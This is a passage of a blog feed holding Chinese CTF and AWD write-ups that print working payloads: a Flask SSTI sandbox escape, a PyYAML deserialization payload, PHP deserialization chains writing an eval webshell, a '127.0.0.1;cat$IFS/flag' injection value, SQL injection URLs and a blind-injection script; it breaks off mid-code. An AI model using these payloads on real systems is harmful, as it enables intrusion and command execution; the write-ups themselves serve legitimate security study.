&lt;p&gt;部分安恒月赛题目的复现记录&lt;/p&gt;
    
    </summary>
    
      <category term="复现" scheme="http://chaosec.top/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>应急挑战杯2019复现</title>
    <link href="http://chaosec.top/2020/09/13/YJTZB2019/"/>
    <id>http://chaosec.top/2020/09/13/YJTZB2019/</id>
    <published>2020-09-13T12:18:00.000Z</published>
    <updated>2020-09-13T12:20:03.190Z</updated>
    
    <content type="html"><![CDATA[<p>历史文章补发</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次线下AWD，打的有些遗憾，不过还是学到了许多东西，因为是awd的原因，题目整体难度挺低的，将题目完整复现一下</p><a id="more"></a><h1 id="Flask商城"><a href="#Flask商城" class="headerlink" title="Flask商城"></a>Flask商城</h1><h2 id="popen-命令执行"><a href="#popen-命令执行" class="headerlink" title="popen()命令执行"></a>popen()命令执行</h2><p>在search路由处存在命令执行漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.method == <span class="string">"POST"</span>:</span><br><span class="line">    url = request.form[<span class="string">'search'</span>]</span><br><span class="line"></span><br><span class="line">    msg = os.popen(url).read() </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> msg == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"search.html"</span>, msg=msg)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"search.html"</span>, msg=<span class="string">"Error.Check your command."</span>)</span><br></pre></td></tr></table></figure><p>非常明显的一个命令执行，popen函数用于从一个命令打开一个管道，会返回一个文件对象，所以可以被用来执行任意系统命令，由于比赛使用的gunicorn服务器，很多人修了洞之后却无法生效（因为没有重启gunicorn服务…）</p><h2 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h2><p>在定义404返回的路由处存在ssti<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(e)</span>:</span></span><br><span class="line">    template = <span class="string">'''</span></span><br><span class="line"><span class="string">        &#123;%% block body %%&#125;</span></span><br><span class="line"><span class="string">        &lt;div class="center-content error"&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;哇哦，This page doesn't exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;这里什么都没有呢٩(๑❛ᴗ❛๑)۶&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &#123;%% endblock %%&#125;</span></span><br><span class="line"><span class="string">        '''</span> % (request.url)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template), <span class="number">404</span></span><br></pre></td></tr></table></figure></p><p>找到SSTI漏洞，接下来就是沙盒逃逸，可用payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;cat &#x2F;flag &gt; &#x2F;home&#x2F;snow&#x2F;sandbox&quot;)&#39;)&#39;</span><br></pre></td></tr></table></figure><p>实例调用__class__属性时会指向该实例所对应的类；由于python允许多重继承，__mro__可以得到该类继承的父类，builtins是解释器自动导入的内置类，__import__()函数能够动态导入一些类从而进行命令执行</p><p>由于flask使用的模板渲染引擎是jinja2，所以payload还可以更简单一些，我们其实随便输入字符串都是有用的，jinja会生成一个undefined类<code>&lt;class &#39;jinja2.runtime.Undefined&#39;&gt;</code>，我们可以直接进行逃逸</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vvv.__class__.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;cat &#x2F;flag &gt; &#x2F;home&#x2F;snow&#x2F;sandbox&quot;)&#39;)</span><br></pre></td></tr></table></figure><h2 id="yaml反序列化"><a href="#yaml反序列化" class="headerlink" title="yaml反序列化"></a>yaml反序列化</h2><p>yaml库在使用yaml.load()方法解析yaml文件时会存在反序列化漏洞，可以使用yaml.safe_load()方法来避免该漏洞</p><p>想要序列化的类名必须使用上下文中存在的类名，但是类名中不一定有执行命令的相应方法，所以最好是通过构造标准类或类函数来实现命令执行，编辑如下文件并上传即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*-* exp.yml *-*</span><br><span class="line"></span><br><span class="line">!!python&#x2F;object&#x2F;new:subprocess.check_output [[&quot;cat&quot;,&quot;&#x2F;flag&quot;]]</span><br></pre></td></tr></table></figure><h1 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h1><h2 id="1、-反序列化"><a href="#1、-反序列化" class="headerlink" title="1、 反序列化"></a>1、 反序列化</h2><p>反序列化漏洞有两处</p><p>第一处在首页存在提示</p><p><img src="/2020/09/13/YJTZB2019/1.png" alt></p><p>定位到cacf.php，查看代码，可以通过反序列化进行文件写入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">'pcaq'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $fp = fopen(<span class="string">"log.php"</span>,<span class="string">"w"</span>) ;       </span><br><span class="line">        fwrite($fp,<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>反序列化写入shell<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">'&lt;?php eval($_GET["snow"]);?&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> chybeta();</span><br><span class="line">$a = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/13/YJTZB2019/2.png" alt></p><p>第二处在common/home.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"ping"</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span><span class="params">($host)</span></span>&#123;</span><br><span class="line">        system(<span class="string">"ping -c 2 $host"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">        $str=str_replace(<span class="string">' '</span>,<span class="string">''</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim(mysql_escape_string($v)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">$a=@$_POST[<span class="string">'a'</span>];</span><br><span class="line">@unserialize(base64_decode($a));</span><br></pre></td></tr></table></figure><p>在析构函数中通过调用ping函数可以实现命令执行，但是在waf函数中屏蔽了空格，用$IFS可以绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">"127.0.0.1;cat\$IFS/flag"</span>);</span><br><span class="line">$obj = <span class="keyword">new</span> home(<span class="string">"ping"</span> ,$arr);</span><br><span class="line">$obj = serialize($obj);</span><br><span class="line">$obj = base64_encode($obj);</span><br><span class="line"><span class="keyword">echo</span> $obj;</span><br></pre></td></tr></table></figure><p><img src="/2020/09/13/YJTZB2019/8.png" alt></p><h2 id="2、万能密码"><a href="#2、万能密码" class="headerlink" title="2、万能密码"></a>2、万能密码</h2><p>登录处存在sql注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"select * from users where username='$username' and password='$password'"</span>;</span><br></pre></td></tr></table></figure><p>可以通过万能密码登录</p><p>密码更新处同样也存在update注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"update users set password='$password' where id='"</span>.$_SESSION[<span class="string">'id'</span>].<span class="string">"';"</span>;</span><br></pre></td></tr></table></figure><h2 id="3、命令执行"><a href="#3、命令执行" class="headerlink" title="3、命令执行"></a>3、命令执行</h2><p>在User.php中存在ping函数可以进行命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ping</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $host = $_POST[<span class="string">'host'</span>];</span><br><span class="line">        system(<span class="string">"ping -c $host"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/09/13/YJTZB2019/3.png" alt></p><h2 id="4、预置后门"><a href="#4、预置后门" class="headerlink" title="4、预置后门"></a>4、预置后门</h2><p>预置后门有两个，一个在include/shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">'admin_ccmd'</span>]);</span><br></pre></td></tr></table></figure><p>另一个在org/smarty/Autofoucer.php</p><p><img src="/2020/09/13/YJTZB2019/7.png" alt></p><h2 id="5、日志文件写入"><a href="#5、日志文件写入" class="headerlink" title="5、日志文件写入"></a>5、日志文件写入</h2><p>根目录下log.php会记录网站访问记录，可以通过构造恶意访问写入shell</p><p><img src="/2020/09/13/YJTZB2019/9.png" alt></p><p><img src="/2020/09/13/YJTZB2019/4.png" alt></p><h2 id="6、上传漏洞"><a href="#6、上传漏洞" class="headerlink" title="6、上传漏洞"></a>6、上传漏洞</h2><p>登录之后存在上传界面，查看上传逻辑代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;notallow=<span class="keyword">array</span>(<span class="string">"php"</span>, <span class="string">"php5"</span>, <span class="string">"php3"</span>, <span class="string">"php4"</span>, <span class="string">"php7"</span>, <span class="string">"pht"</span>, <span class="string">"phtml"</span>, <span class="string">"htaccess"</span>,<span class="string">"html"</span>, <span class="string">"swf"</span>, <span class="string">"htm"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $id=$_SESSION[<span class="string">'id'</span>];</span><br><span class="line">    $upfile=$_FILES[<span class="string">'pic'</span>];</span><br><span class="line">    $fileinfo=pathinfo($upfile[<span class="string">"name"</span>]);</span><br><span class="line">    <span class="keyword">if</span>(in_array($fileinfo[<span class="string">"extension"</span>],<span class="keyword">$this</span>-&gt;notallow))&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有对大小写进行过滤，可以构造恶意文件上传</p><p><img src="/2020/09/13/YJTZB2019/5.png" alt></p><p><img src="/2020/09/13/YJTZB2019/6.png" alt></p><h1 id="Thinkphp5"><a href="#Thinkphp5" class="headerlink" title="Thinkphp5"></a>Thinkphp5</h1><p>公开CVE，略</p><p><strong>reference：</strong><br><a href="https://xz.aliyun.com/t/52" target="_blank" rel="noopener">https://xz.aliyun.com/t/52</a><br><a href="https://xz.aliyun.com/t/2908#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/2908#toc-0</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;历史文章补发&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;第一次线下AWD，打的有些遗憾，不过还是学到了许多东西，因为是awd的原因，题目整体难度挺低的，将题目完整复现一下&lt;/p&gt;
    
    </summary>
    
      <category term="复现" scheme="http://chaosec.top/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="AWD" scheme="http://chaosec.top/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF_WEB(一)</title>
    <link href="http://chaosec.top/2020/04/02/buuctf/"/>
    <id>http://chaosec.top/2020/04/02/buuctf/</id>
    <published>2020-04-02T10:43:19.000Z</published>
    <updated>2020-04-02T15:04:16.692Z</updated>
    
    <content type="html"><![CDATA[<p>今年寒假真的太长了，后半年又因为考研什么都没学，趁这段时间复现学习一波~</p><a id="more"></a><h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>简单的万能密码即可登录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b8506b10-95f5-4f01-b77a-8485ee19e068.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin%27+or+1%23&amp;password&#x3D;fads</span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><p>签到题，查看网页源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">        $cat=$_GET[<span class="string">'cat'</span>];</span><br><span class="line">        <span class="keyword">echo</span> $cat;</span><br><span class="line">        <span class="keyword">if</span>($cat==<span class="string">'dog'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        --&gt;</span><br></pre></td></tr></table></figure><p>然后提交get参数<code>cat=dog</code>即可getflag</p><h1 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h1><p>本题是一个数字型注入，注入点在<code>id</code>参数，过滤了部分敏感词，如<code>and</code>，<code>空格</code>等，使用异或符号可以正常返回数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0^(1)</span><br></pre></td></tr></table></figure><p>所以可以据此进行盲注，但是题目过滤了空格，经过尝试发现空格无法用特殊字符绕过，不过此处可以使用无空格方式来注入，即通过括号包裹来避免使用空格，比如：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(*)<span class="keyword">from</span>(<span class="keyword">admin</span>);</span><br></pre></td></tr></table></figure></p><p>盲注脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base_url = <span class="string">'http://33afb64c-ecb9-427b-b24e-100dbb7dd810.node3.buuoj.cn/search.php'</span></span><br><span class="line">ws = string.printable[:<span class="number">-6</span>]</span><br><span class="line">sign = <span class="string">"NO! Not this"</span></span><br><span class="line">table_name = <span class="string">"F1naI1y,Flaaaaag"</span></span><br><span class="line"><span class="comment"># column_name = 'id,fl4gawsl'   Flaaag</span></span><br><span class="line"><span class="comment"># column_name = 'id,username,password'</span></span><br><span class="line">column_name = <span class="string">'mygodcl4y_is_really_amazing,welco'</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ws:</span><br><span class="line">        <span class="comment"># payload1 = "?id=0^(select(ascii(substr((select(group_concat(table_name))from(information_schema.tables)"\</span></span><br><span class="line">            <span class="comment"># "where(table_schema=database())),&#123;&#125;,1))=&#123;&#125;))"</span></span><br><span class="line">        <span class="comment"># payload2 = "?id=0^(select(ascii(substr((select(group_concat(column_name))from(information_schema.columns)"\</span></span><br><span class="line">            <span class="comment"># "where(table_name='F1naI1y')),&#123;&#125;,1))=&#123;&#125;))"</span></span><br><span class="line">        payload2 = <span class="string">"?id=0^(select(ascii(substr((select(group_concat(username,password))from(F1naI1y)),&#123;&#125;,1))=&#123;&#125;))"</span></span><br><span class="line">        res = requests.get(base_url + payload2.format(len(column_name)+<span class="number">1</span>, ord(i))).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">if</span> sign <span class="keyword">in</span> res:</span><br><span class="line">            column_name += i</span><br><span class="line">            print(column_name)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>不得不吐槽一下的是flag所在表数据真的有点长，我都怀疑flag是不是不在这个表里面，如果只跑password字段的话应该会短一点</p><p><img src="/2020/04/02/buuctf/21.png" alt></p><h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>打开网站之后查看源代码可以看到提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id&#x3D;&quot;master&quot; href&#x3D;&quot;.&#x2F;Archive_room.php&quot; style&#x3D;&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;&gt;Oh! You found me&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><br>访问Archive_room.php，题目提示<code>没看清么？请回去仔细看看</code>，应该是发生了跳转，抓包，发现了新的页面<code>secr3t.php</code>，访问得到源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>然后就是文件包含<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;a74e337d-43ce-4de5-af4a-08d701cec8b1.node3.buuoj.cn&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><br>解码即可得到flag</p><h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p>题目提示了网站备份，随手测试www.zip可以down到源码<br>查看index.php发现存在反序列化<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">    $select = $_GET[<span class="string">'select'</span>];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>查看class.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>很简单的反序列化，username为admin且password为100即可getflag，只需要绕过一下wakeup函数即可<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> 